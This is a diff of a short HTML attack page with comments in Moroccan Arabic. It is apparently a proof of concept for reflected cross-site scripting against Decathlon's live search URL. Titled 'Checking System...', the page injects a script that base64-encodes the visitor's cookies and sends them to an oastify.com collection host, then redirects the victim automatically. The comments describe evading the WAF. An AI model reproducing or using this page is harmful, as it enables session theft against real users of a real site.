@@ -1,18 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Checking System...</title>
 </head>
 <body>
     <script>
-        // هاد الكود كيحاول يهرب من الـ HTML Tags ويضرب الـ Javascript مباشرة
-        // استعملنا encodeURIComponent باش الرموز بحال ' و ; يدوزو بلا ما يتبلوكاو في الطريق
-        let payload = "';fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?c='+btoa(document.cookie));//";
+        // 1. الكود اللي غيسحب الكوكيز ويصيفطهم لـ Collaborator
+        // استعملنا btoa باش نشفرو الداتا و encodeURIComponent باش نهربو من الـ WAF
+        var payload = "fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?data='+btoa(document.cookie))";
         
-        let encoded = encodeURIComponent(payload);
-        
-        // غادي يصيفط الضحية لـ Decathlon مع الـ Payload
-        window.location.href = "https://www.decathlon.com/search?q=" + encoded;
+        // 2. الرابط المعتوب اللي عطيتيني + الكود ديال السحب
+        // هرسنا الـ Tags وزرعنا الـ script اللي كيدير fetch
+        var xssUrl = "https://www.decathlon.com/search?q=</h1></title><script>" + payload + "<\/script>";
+
+        // 3. التحويل التلقائي
+        window.location.href = xssUrl;
     </script>
 </body>
 </html>
